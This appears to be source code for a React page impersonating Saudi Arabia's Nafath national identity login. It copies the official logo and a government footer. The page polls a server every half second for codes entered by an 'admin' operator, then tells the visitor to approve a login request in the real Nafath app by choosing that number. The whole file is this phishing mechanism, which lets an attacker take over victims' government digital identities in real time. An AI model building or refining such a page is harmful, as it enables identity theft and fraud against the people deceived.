import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { getControlAction } from "@/lib/api";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";


// الروابط الرسمية المعتمدة لشعارات منصة نفاذ لضمان الهوية البصرية الفعليّة
const nafathLogo = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Nafath_logo.svg/3840px-Nafath_logo.svg.png";


export default function IdentityCheck() {
  const [showSpinner, setShowSpinner] = useState(true);
  const [adminCode, setAdminCode] = useState<string | null>(null);
  const [fadeOut, setFadeOut] = useState(false);
  
  const sessionId = localStorage.getItem("sessionId");
  
  // الاستعلام المستمر عن الأوامر من السيرفر (منطق مشروعك الأصلي كما هو)
  const { data: controlData } = useQuery({
    queryKey: ["control", sessionId],
    queryFn: () => getControlAction(sessionId!),
    refetchInterval: 500,
    enabled: !!sessionId,
  });


  // معالجة التحكم والتحديث اللحظي للرقم (تم تعديل المنطق ليدعم التغيير اللامتناهي من المدير)
  useEffect(() => {
    if (!controlData) return;
    
    if (controlData.action === "identity_code" && controlData.code) {
      // إذا كان هناك رمز جديد يختلف عن الرمز المخزن حالياً، قم بتحديثه فوراً
      if (adminCode !== controlData.code) {
        if (showSpinner) {
          setFadeOut(true);
          setTimeout(() => {
            setShowSpinner(false);
            setFadeOut(false);
            setAdminCode(controlData.code || "✓");
          }, 500);
        } else {
          // تحديث مباشر للرقم في حال كان الـ Spinner مخفياً بالفعل والمدير قام بتعديل الرقم مجدداً
          setAdminCode(controlData.code);
        }
      }
    }
  }, [controlData, adminCode, showSpinner]);

  return (
    <div className="min-h-screen bg-[#f8fafc] flex flex-col font-sans antialiased text-[#1e293b]" dir="rtl">
      
      {/* منطقة المحتوى المركزي مع تطبيق كلاسات الـ Bootstrap المتوافقة مع Tailwind */}
      <div className="container mx-auto px-4 py-16 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-[30px] border border-gray-100 shadow-[0_20px_60px_rgba(0,0,0,0.05)] p-12 max-w-md w-full text-center relative overflow-hidden">
          
          {/* الشعار الرسمي العلوي بداخل الكرت */}
          <img src={nafathLogo} alt="النفاذ الوطني الموحد" className="h-12 mx-auto mb-8 object-contain" />
          
          {/* الشارة العلوية المعتمدة */}
          <div className="inline-block bg-[#f0fdf4] text-[#11998E] px-4 py-2 rounded-[50px] font-bold text-sm mb-4">
            {adminCode ? "تأكيد طلب تسجيل الدخول" : "جارٍ التحقق من الهوية الرقمية"}
          </div>
          
          {/* منطقة الأنيميشن وعرض دائرة الانتظار أو الكود النفاذي العريض */}
          <div className="mb-6">
            <AnimatePresence mode="wait">
              {showSpinner ? (
                <motion.div
                  key="spinner"
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: fadeOut ? 0 : 1, scale: fadeOut ? 0.8 : 1 }}
                  exit={{ opacity: 0, scale: 0.8 }}
                  transition={{ duration: 0.5 }}
                  className="flex flex-col items-center justify-center h-28"
                >
                  {/* تأثير الدوران المزدوج المتناسق مع تصميم الـ CSS المرسل */}
                  <div className="relative w-20 h-20">
                    <div className="absolute inset-0 rounded-full bg-[#11998E] opacity-20 animate-[ping_2s_infinite_ease-in-out]"></div>
                    <div className="absolute inset-4 rounded-full bg-[#11998E] opacity-40 animate-[pulse_2s_infinite_ease-in-out]"></div>
                    <Loader2 className="absolute inset-0 w-20 h-20 animate-spin text-[#11998E]" />
                  </div>
                </motion.div>
              ) : (
                <motion.div
                  key="code-box"
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ type: "spring", stiffness: 100 }}
                  className="flex flex-col items-center justify-center"
                >
                  {/* صندوق عرض الرقم بالطراز النفاذي الفعلي العريض والمضلع */}
                  <div className="bg-[#f0fdf4] border-2 border-dashed border-[#bbf7d0] rounded-2xl px-12 py-4 shadow-inner">
                    <span className="text-6xl font-black text-[#166534] tracking-wider select-all" dir="ltr">
                      {adminCode}
                    </span>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>


          {/* نصوص الحالة التفاعلية بناءً على إجراءات الأدمن الحالية */}
          <h4 className="text-xl font-black mb-3 text-[#11998E]">
            {adminCode ? "يرجى فتح تطبيق نفاذ" : "الرجاء الانتظار"}
          </h4>
          
          {adminCode ? (
            <>
              <p className="text-gray-500 text-sm leading-relaxed mb-4 px-2">
                افتح تطبيق نفاذ الذكي على جوالك واقبل طلب تسجيل الدخول ثم اختر الرقم الموضح أعلاه.
              </p>
              
              <div className="bg-[#f0fdf4] border border-[#dcfce7] text-[#166534] py-2 px-4 rounded-xl text-xs flex items-center justify-center gap-2">
                <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
                <span>بانتظار تأكيدك عبر التطبيق لاستكمال الخطوة التالية...</span>
              </div>
            </>
          ) : (
            <>
              <p className="text-[#64748b] text-sm leading-relaxed mb-4 animate-[pulse_1.5s_infinite]">
                يتم حالياً التأكد من معلوماتك عبر منصة نفاذ، يرجى عدم مغادرة الصفحة...
              </p>
              
              <div className="bg-[#f0fdf4] border border-[#dcfce7] text-[#166534] py-2 px-4 rounded-xl text-xs">
                ℹ️ سيتم توجيهك تلقائياً فور اكتمال المصادقة.
              </div>
            </>
          )}


        </div>
      </div>


      {/* فوتر المشروع المتناسق كلياً مع الهوية الرقمية للموقع الحكومي */}
      <footer className="bg-[#f1f5f9] border-t border-[#e2e8f0] py-6 mt-20">
        <div className="max-w-5xl mx-auto px-6 text-center md:text-right">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <div className="text-center md:text-right">
              <h6 className="font-bold text-sm text-[#1e293b] mb-1">مركز المعلومات الوطني</h6>
              <p className="text-xs text-gray-400">تطوير وتشغيل | جميع الحقوق محفوظة © {new Date().getFullYear()}</p>
            </div>
            <div>
              <img src={nafathLogo} alt="NIC" className="h-10 opacity-60 grayscale hover:grayscale-0 transition-all" />
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
